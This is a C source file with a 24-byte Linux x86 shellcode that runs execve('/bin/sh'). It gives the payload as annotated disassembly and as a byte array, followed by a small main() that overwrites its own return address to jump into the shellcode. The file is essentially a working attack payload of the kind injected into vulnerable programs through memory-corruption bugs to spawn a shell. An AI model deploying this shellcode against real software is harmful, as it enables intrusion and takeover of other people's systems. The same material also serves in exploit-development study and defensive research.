/*
 *  execve ("/bin/sh"..) (linux little endian)
 *
 *  Copyright (c) 2001 Nicola Bonelli <bonelli@antifork.org>
 *		       Quequero <quequero@bitchx.it> 
 *
 *  All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 */

/****
 8048318:       31 d2                   xor    %edx,%edx
 804831a:       52                      push   %edx
 804831b:       68 6e 2f 73 68          push   $0x68732f6e     "n/sh"
 8048320:       68 2f 2f 62 69          push   $0x69622f2f     "//bi"
 8048325:       89 e3                   mov    %esp,%ebx
 8048327:       52                      push   %edx
 8048328:       53                      push   %ebx
 8048329:       89 e1                   mov    %esp,%ecx
 804832b:       8d 42 0b                lea    0xb(%edx),%eax
 804832e:       cd 80                   int    $0x80
****/

char shellcode_24[] = 	"\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69"
			"\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80";

int main() {
   long *ret;

   ret = (long *)&ret + 2;
   (*ret) = (long)shellcode_24;

   return 0;
}

